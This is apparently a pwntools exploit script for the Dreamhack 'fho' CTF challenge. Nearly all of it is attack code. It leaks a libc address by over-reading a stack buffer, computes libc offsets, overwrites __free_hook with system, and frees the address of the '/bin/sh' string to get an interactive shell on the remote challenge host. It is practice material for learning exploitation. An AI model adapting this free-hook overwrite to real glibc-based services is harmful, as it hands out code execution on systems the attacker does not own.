#!/usr/bin/env python3

from pwn import *

exe = ELF('fho_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+206
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 21102)
else:
    p = process([exe.path])
GDB()

############################
### STAGE 1: Leak Canary ###
############################
sla(b'Buf: ', b'A'*8*9)
p.recvuntil(b'A'*8*9)
libc_leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = libc_leak - 0x21b0a
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

###################################################
### STAGE 2: Overwrite __free_hook thanh system ###
###################################################
free_hook = libc.address + 0x3ed8e8
system_addr = libc.address + 0x4f550
slna(b'To write: ', free_hook)
slna(b'With: ', system_addr)

#####################################
### STAGE 3: Free /bin/sh address ###
#####################################
binsh_addr = libc.address + 0x1b3e1a
slna(b'To free: ', binsh_addr)

p.interactive()